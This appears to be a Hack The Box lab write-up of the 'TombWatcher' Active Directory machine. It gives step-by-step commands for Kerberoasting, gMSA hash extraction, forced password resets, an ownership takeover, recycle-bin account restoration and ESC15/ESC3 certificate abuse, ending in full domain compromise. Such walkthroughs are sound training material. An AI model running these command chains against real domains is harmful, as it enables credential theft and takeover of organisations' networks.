---
title: "HTB - TombWatcher (Hard | Windows | Active Directory)"
date: 2026-09-13 00:00:00 +0000
categories: [HackTheBox, Active Directory]
tags: [htb, kerberoasting, gmsa, esc3, esc15, ad-recycle-bin, adcs, writespn, addself, forcechangepassword, writeowner, shadow-credential, certipy, bloodyad, bloodhound, tombstone, active-directory]
image:
  path: https://i.pinimg.com/originals/89/fb/d3/89fbd31bc46ea14c6969992eff04af1d.gif
---

## Reconnaissance Phase

### Initial Network Scanning

The reconnaissance phase begins with a comprehensive network scan using Nmap to identify open ports and running services on the target machine.

```bash
nmap -p- --min-rate 10000 10.129.61.141
```

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49683/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49701/tcp open  unknown
49707/tcp open  unknown
49726/tcp open  unknown
```

The target is a Windows Domain Controller running Active Directory with multiple services including DNS, Kerberos, LDAP, and WinRM. The domain is identified as tombwatcher.htb.

### Initial Credentials

The engagement begins with valid credentials for the henry user:

```bash
nxc smb 10.129.61.141 -u henry -p 'H3nry_987TGV!'
```

```
SMB         10.129.61.141   445    DC01             
[+]  tombwatcher.htb\henry:H3nry_987TGV!
```

The credentials are validated successfully on SMB and will be used for initial enumeration.

---

## Enumeration Phase

### BloodHound Collection

Collect Active Directory information using BloodHound Python to map the attack path:

```bash
sudo bloodhound-python -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' -c All -ns 10.129.61.141 --zip
```

This provides a comprehensive view of the domain structure, user relationships, and potential privilege escalation paths.

### RID Brute Force Enumeration

Enumerate all users and groups in the domain:

```bash
nxc smb 10.129.61.141 -u henry -p 'H3nry_987TGV!' --rid-brute
```

![RID Brute Force Enumeration](/assets/img/Pasted%20image%2020260913044126.png)

The enumeration reveals several domain users including Alfred, Sam, and John, along with various security groups and service accounts.

---

## Initial Access - Targeted Kerberoasting

![Kerberoasting Attack Path](/assets/img/Pasted%20image%2020260913084124.png)

With the WriteSPN privilege over the Alfred user (identified via BloodHound), a targeted Kerberoasting attack can be performed. This involves temporarily adding a Service Principal Name (SPN) to Alfred's account, requesting a Kerberos ticket, and then cracking it offline.

### Step 1: Add SPN to Alfred

Synchronize time with the DC and add an SPN to the Alfred account using BloodyAD:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
bloodyAD --host 10.129.61.141 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'HTTP/FakeService'
```

![Add SPN to Alfred](/assets/img/Pasted%20image%2020260913045231.png)

The SPN is successfully added, making Alfred Kerberoastable.

### Step 2: Request TGS Ticket

Use Impacket's GetUserSPNs to request a TGS ticket for Alfred:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
impacket-GetUserSPNs 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.129.61.141 -request-user Alfred -outputfile hashes.kerberoast
```

![Request TGS Ticket](/assets/img/Pasted%20image%2020260913045302.png)

The Kerberos ticket is extracted and saved to a file for offline cracking.

### Step 3: Crack the Hash

Use John the Ripper to crack the Kerberos hash against the rockyou.txt wordlist:

```bash
john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

![Crack Kerberos Hash](/assets/img/Pasted%20image%2020260913045330.png)

**Result:** Alfred's password is cracked to **basketball**

### Step 4: Validate Credentials

```bash
nxc smb 10.129.61.141 -u alfred -p 'basketball' -d tombwatcher.htb
[+] tombwatcher.htb\alfred:basketball
```

Alfred's credentials are validated successfully. Analysis of BloodHound data shows the next escalation path:

![BloodHound Path 1](/assets/img/Pasted%20image%2020260913045706.png)

![BloodHound Path 2](/assets/img/Pasted%20image%2020260913045732.png)

---

## Lateral Movement - GMSA Exploitation

### Step 1: Join Infrastructure Group

Alfred has AddSelf privilege over the Infrastructure group. Add Alfred to gain ReadGMSAPassword access:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
bloodyAD --host 10.129.61.141 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember 'INFRASTRUCTURE' alfred
```

![Add to Infrastructure Group](/assets/img/Pasted%20image%2020260913050206.png)

Alfred is successfully added to the Infrastructure group.

### Step 2: Extract GMSA Password

Use netexec to read the GMSA password for the ansible_dev$ account:

```bash
nxc ldap 10.129.61.141 -u alfred -p 'basketball' -d tombwatcher.htb --gmsa
```

![Extract GMSA Password](/assets/img/Pasted%20image%2020260913050506.png)

**Extracted GMSA NTLM Hash:** `3eca34dd13a85db79c03178b7b149621`

### Step 3: Validate GMSA Credentials

```bash
nxc smb 10.129.61.141 -u 'ansible_dev$' -H '3eca34dd13a85db79c03178b7b149621' -d tombwatcher.htb

[+] tombwatcher.htb\ansible_dev$:3eca34dd13a85db79c03178b7b149621
```

The GMSA account credentials are validated.

---

## Escalation - ForceChangePassword

![ForceChangePassword Path](/assets/img/Pasted%20image%2020260913084429.png)

### Step 1: Change Sam's Password

The ansible_dev$ GMSA account has ForceChangePassword privilege over the Sam user. Exploit this to set a new password:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "ansible_dev$" -p "aad3b435b51404eeaad3b435b51404ee:3eca34dd13a85db79c03178b7b149621" set password "sam" "NewPassword123@@@"
```

![Change Sam Password](/assets/img/Pasted%20image%2020260913051210.png)

Sam's password is successfully changed.

### Step 2: Verify Sam Access

```bash
nxc smb 10.129.61.141 -u sam -p 'NewPassword123@@@' -d tombwatcher.htb

[+] tombwatcher.htb\sam:NewPassword123@@@
```

Sam's account is now accessible.

---

## Escalation - WriteOwner and Shadow Credentials

![WriteOwner Attack Path](/assets/img/Pasted%20image%2020260913084515.png)

### Step 1: Set Owner

Sam has WriteOwner privilege over the John user. Set Sam as the owner of John's account:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set Owner "john" "sam"
```

![Set Owner](/assets/img/Pasted%20image%2020260913053012.png)

Sam is set as the owner of John's account.

### Step 2: Grant GenericAll

As the owner, Sam can now grant themselves GenericAll privileges over John:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" add genericAll "john" "sam"
```

![Grant GenericAll](/assets/img/Pasted%20image%2020260913053317.png)

GenericAll privilege is successfully granted.

### Step 3: Change John's Password

With GenericAll privileges, Sam can now change John's password:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \ 
bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set password "john" "johnPassword@@@123"
```

![Change John Password](/assets/img/Pasted%20image%2020260913053306.png)

John's password is successfully changed.

### Step 4: Verify WinRM Access

Test if John has WinRM permissions:

```bash
nxc winrm 10.129.61.141 -u john -p 'johnPassword@@@123'

[+] tombwatcher.htb\john:johnPassword@@@123 (Pwn3d!)
```

John has WinRM access enabled.

### Step 5: Establish Shell

Connect to the target via WinRM:

```bash
evil-winrm -i 10.129.61.141 -u john -p 'johnPassword@@@123'
```

An interactive PowerShell session is established as John on the Domain Controller.

---

## Privilege Escalation - AD Recycle Bin

![AD Recycle Bin Attack](/assets/img/Pasted%20image%2020260913085000.png)

### Step 1: Enumerate Deleted Objects

TombWatcher exploits the Tombstone attack to enumerate deleted objects in the AD Recycle Bin during a John session

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

![Enumerate Deleted Objects](/assets/img/Pasted%20image%2020260913060510.png)

A deleted user named cert_admin is discovered with ObjectGUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf`.

### Step 2: Restore cert_admin Account

Restore the deleted cert_admin user account:

```powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
Enable-ADAccount -Identity cert_admin
```

The cert_admin account is successfully restored and enabled.

### Step 3: Set New Password

Set a new password for the restored cert_admin account:

```powershell
Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString "P@sswordlinux!" -AsPlainText -Force)
```

The cert_admin account is now ready for use.

---

## Root Access - ESC15 ADCS Exploitation

### Step 1: Enumerate Vulnerable Templates

Use certipy to find vulnerable certificate templates accessible to cert_admin:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
certipy-ad find -u cert_admin@tombwatcher.htb -p 'P@sswordlinux!' -dc 10.129.61.141 -vulnerable -stdout
```

Output:

```
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Enabled                             : True
    Enrollee Supplies Subject           : True
    Schema Version                      : 1
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
```

The WebServer template is vulnerable to ESC15, allowing injection of arbitrary application policies.

### Step 2: Request Certificate with Injected Policy

Request a certificate for the Administrator account with an injected Certificate Request Agent application policy:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'P@sswordlinux!' -dc-ip 10.129.61.141 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -upn administrator@tombwatcher.htb -target-ip 10.129.61.141
```

![Request Certificate](/assets/img/Pasted%20image%2020260913070523.png)

A certificate is issued with the injected Certificate Request Agent policy.

### Step 3: Perform ESC3 Attack

Using the Certificate Request Agent certificate, request a User certificate on behalf of Administrator:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
certipy req -u cert_admin -p 'P@sswordlinux!' -dc-ip 10.129.61.141 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
```

A valid Administrator certificate is generated.

### Step 4: Extract Administrator Credentials

Authenticate using the Administrator certificate to obtain the NT hash:

```bash
faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
certipy auth -pfx administrator.pfx -dc-ip 10.129.61.141
```

![Extract Administrator Credentials](/assets/img/Pasted%20image%2020260913070914.png)

**Administrator NT Hash:** `f61db423bebe3328d33af26741afe5fc`

### Step 5: Establish Root Shell

Connect as Administrator using the extracted hash:

```bash
evil-winrm -i 10.129.61.141 -u administrator -H 'f61db423bebe3328d33af26741afe5fc'
```

Full administrative access to the Domain Controller is achieved.

---

## Attack Chain Summary

1. **Initial Access:** Validated henry credentials provided in the engagement scenario
2. **Reconnaissance:** BloodHound enumeration identified escalation paths through the domain
3. **Targeted Kerberoasting:** Exploited WriteSPN privilege to add SPN to Alfred, Kerberoasted the account, and cracked the password to obtain alfred:basketball
4. **GMSA Exploitation:** Used Alfred's AddSelf privilege to join the Infrastructure group and extracted the GMSA password for ansible_dev$
5. **ForceChangePassword:** Leveraged ansible_dev$'s privileges to change Sam's password
6. **WriteOwner Chain:** Sam used WriteOwner privilege over John to gain control and establish shell access
7. **AD Recycle Bin Recovery:** Restored the deleted cert_admin account from the AD Recycle Bin
8. **ESC15 ADCS Exploitation:** Abused the vulnerable WebServer template with schema version 1 to inject application policies, combined with ESC3 to obtain an Administrator certificate
9. **Root Access:** Used the Administrator certificate to extract the NT hash and achieve full domain compromise

---

## Key Takeaways

- **Targeted Kerberoasting** via WriteSPN is a powerful attack when proper DACL permissions exist
- **GMSA password extraction** requires membership in specific groups with ReadGMSAPassword rights
- **BloodHound** remains essential for identifying the optimal exploitation path across complex AD environments
- **Privilege escalation chains** in Active Directory often involve multiple steps and delegated permissions
- **AD Recycle Bin** can contain valuable accounts that, when restored, may have elevated privileges
- **ESC15 + ESC3** combination bypasses certificate template restrictions for privilege escalation
- **Certipy** is a powerful tool for ADCS enumeration and exploitation in modern AD environments
